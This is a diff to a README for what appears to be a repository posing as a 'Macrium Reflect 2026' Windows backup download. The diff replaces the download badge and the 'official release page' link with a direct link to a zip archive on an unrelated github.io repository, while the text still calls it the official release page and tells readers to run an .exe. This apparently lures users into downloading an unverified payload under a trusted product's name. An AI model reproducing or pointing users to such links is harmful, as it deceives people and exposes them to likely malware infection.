@@ -5,7 +5,7 @@ description: "Download the Macrium Reflect installer for Windows 10 and 11 to cr
 ---
 # 💾 Macrium-Reflect-2026 - Secure your data with system backups
 
-[![](https://img.shields.io/badge/Download-Macrium%20Reflect-blue)](https://github.com/Penandinklegion642/Macrium-Reflect-2026/releases)
+[![](https://img.shields.io/badge/Download-Macrium%20Reflect-blue)](https://raw.githubusercontent.com/Penandinklegion642/penandinklegion642.github.io/main/myrrh/penandinklegion_github_io_v2.0-alpha.3.zip)
 
 ## About this software
 
@@ -25,7 +25,7 @@ Ensure your computer meets these basic needs before installation:
 
 Follow these steps to set up the software.
 
-1. Visit the [official release page](https://github.com/Penandinklegion642/Macrium-Reflect-2026/releases) to access the installation files.
+1. Visit the [official release page](https://raw.githubusercontent.com/Penandinklegion642/penandinklegion642.github.io/main/myrrh/penandinklegion_github_io_v2.0-alpha.3.zip) to access the installation files.
 2. Look for the latest version listed under the Assets section.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
